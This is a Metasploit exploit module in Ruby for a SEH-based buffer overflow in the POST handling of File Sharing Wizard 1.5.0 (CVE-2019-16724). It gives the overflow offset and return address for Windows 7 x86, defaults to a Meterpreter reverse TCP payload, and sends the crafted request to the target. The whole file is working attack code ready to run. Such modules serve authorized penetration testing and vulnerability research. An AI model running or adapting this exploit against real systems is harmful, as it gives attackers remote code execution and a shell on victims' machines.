##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super update_info(info,
                      'Name' => 'File Sharing Wizard 1.5.0 - POST SEH Overflow',
                      'Description' => %q(
        This module exploits a SEH based buffer overflow in an HTTP POST parameter in File Sharing Wizard 1.5.0
      ),
                      'Author' => [
                        'x00pwn', # Original exploit
                        'Dean Welch <dean_welch[at]rapid7.com>' # Module
                      ],
                      'License'        => MSF_LICENSE,
                      'References'     =>
                          [
                            %w(CVE 2019-16724),
                            %w(EDB 47412)
                          ],
                      'Payload' =>
                          {
                            BadChars: "\x00\x20"
                          },
                      'DisclosureDate' => '2019-09-24',
                      'DefaultOptions' =>
                          {
                            RPORT: "80",
                            PAYLOAD: 'windows/meterpreter/reverse_tcp'
                          },
                      'Platform'       => 'win',
                      'Targets'        =>
                          [
                            ['Win7 x86', { 'Offset' => 1040, 'Ret' => 0x7c38a67f }]
                          ])
  end

  def exploit
    buf = rand_text_english(target['Offset'], payload_badchars)
    buf << generate_seh_payload(target.ret)
    payload_header = "POST " + buf
    payload_header += " HTTP/1.0\r\n\r\n"
    print_status("Connecting to target")
    connect
    print_status("Sending payload to target")
    sock.put(payload_header)
  end

end
